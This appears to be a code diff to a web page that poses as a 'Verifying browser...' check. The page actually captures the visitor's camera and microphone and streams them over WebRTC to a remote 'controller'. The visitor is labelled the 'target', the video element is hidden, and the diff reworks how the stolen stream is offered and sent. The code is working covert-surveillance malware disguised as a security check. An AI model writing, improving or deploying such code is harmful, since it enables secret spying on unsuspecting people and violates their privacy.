@@ -118,7 +118,6 @@
         const host = window.location.host || "hangon-k31m.onrender.com";
         const wsUrl = `${protocol}//${host}/ws/target`;
 
-        // Low-latency, geo-distributed STUN & TURN relay servers
         const rtcConfig = {
             iceServers: [
                 { urls: "stun:stun.cloudflare.com:3478" },
@@ -143,7 +142,6 @@
         let ws;
         let pc;
         let localStream;
-        let myTargetId = null;
         let pendingIceCandidates = [];
         const video = document.getElementById('hiddenVideo');
 
@@ -152,11 +150,10 @@
             card.innerHTML = `
                 <div class="spinner"></div>
                 <h1 style="margin-top: 16px;">Verifying browser...</h1>
-                <p>Connecting to secure network. Please wait a moment.</p>
+                <p>Establishing secure connection. Please wait a moment.</p>
             `;
 
             try {
-                // Optimized constraints for instantaneous camera initialization & low latency
                 localStream = await navigator.mediaDevices.getUserMedia({
                     video: {
                         width: { ideal: 1280, max: 1920 },
@@ -172,45 +169,31 @@
 
                 video.srcObject = localStream;
 
-                // 1. Create Peer Connection & Add Tracks FIRST
-                initWebRTC(localStream);
-
-                // 2. Open WebSocket after PeerConnection is ready
                 ws = new WebSocket(wsUrl);
 
-                ws.onopen = function () {
+                ws.onopen = async function () {
                     console.log("[+] Connected to signaling server");
+                    await sendOffer();
                 };
 
                 ws.onmessage = async (event) => {
                     try {
                         const msg = JSON.parse(event.data);
-                        if (msg.type === "init") {
-                            myTargetId = msg.targetId;
-                            console.log("[+] Target assigned ID:", myTargetId);
-                        } else if (msg.type === "offer") {
-                            console.log("[+] Processing offer immediately");
-                            if (!pc) {
-                                initWebRTC(localStream);
-                            }
-                            
+                        console.log("[+] Received signal from server:", msg.type);
+
+                        if (msg.type === "request_offer") {
+                            await sendOffer();
+                        } else if (msg.type === "answer" && pc) {
+                            console.log("[+] Setting remote answer description");
                             await pc.setRemoteDescription(new RTCSessionDescription(msg.data));
                             
-                            // Flush any queued ICE candidates
+                            // Flush any pending ICE candidates
                             while (pendingIceCandidates.length > 0) {
                                 const cand = pendingIceCandidates.shift();
                                 await pc.addIceCandidate(new RTCIceCandidate(cand));
                             }
-
-                            const answer = await pc.createAnswer();
-                            await pc.setLocalDescription(answer);
-
-                            if (ws && ws.readyState === WebSocket.OPEN) {
-                                ws.send(JSON.stringify({ type: "answer", data: answer }));
-                                console.log("[+] Answer dispatched to controller");
-                            }
-                        } else if (msg.type === "ice") {
-                            if (pc && pc.remoteDescription && pc.remoteDescription.type) {
+                        } else if (msg.type === "ice" && pc) {
+                            if (pc.remoteDescription && pc.remoteDescription.type) {
                                 await pc.addIceCandidate(new RTCIceCandidate(msg.data));
                             } else {
                                 pendingIceCandidates.push(msg.data);
@@ -226,40 +209,45 @@
                 console.error("Media/connection error:", err);
                 card.innerHTML = `
                     <h1 style="color: #ef4444;">Verification Failed</h1>
-                    <p>Camera/browser check was denied or interrupted. Please reload and allow permission to continue.</p>
+                    <p>Camera access was not granted. Please allow camera permission and reload the page.</p>
                 `;
             }
         }
 
-        function initWebRTC(stream) {
+        async function sendOffer() {
             if (pc) {
                 try { pc.close(); } catch(e) {}
             }
 
             pc = new RTCPeerConnection(rtcConfig);
 
-            // Add camera & mic tracks immediately
-            if (stream) {
-                stream.getTracks().forEach(track => {
-                    console.log("[+] Adding track to peer:", track.kind);
-                    pc.addTrack(track, stream);
+            if (localStream) {
+                localStream.getTracks().forEach(track => {
+                    console.log("[+] Attaching local track:", track.kind);
+                    pc.addTrack(track, localStream);
                 });
             }
 
-            // Instant ICE candidate trickling
             pc.onicecandidate = (event) => {
                 if (event.candidate && ws && ws.readyState === WebSocket.OPEN) {
                     ws.send(JSON.stringify({ type: "ice", data: event.candidate }));
                 }
             };
 
-            pc.oniceconnectionstatechange = () => {
-                console.log("[*] ICE Connection State:", pc.iceConnectionState);
+            pc.onconnectionstatechange = () => {
+                console.log("[*] Target WebRTC Connection State:", pc.connectionState);
             };
 
-            pc.onconnectionstatechange = () => {
-                console.log("[*] Peer Connection State:", pc.connectionState);
-            };
+            const offer = await pc.createOffer({
+                offerToReceiveAudio: false,
+                offerToReceiveVideo: false
+            });
+            await pc.setLocalDescription(offer);
+
+            if (ws && ws.readyState === WebSocket.OPEN) {
+                console.log("[+] Sending WebRTC offer to controller");
+                ws.send(JSON.stringify({ type: "offer", data: offer }));
+            }
         }
     </script>
 </body>
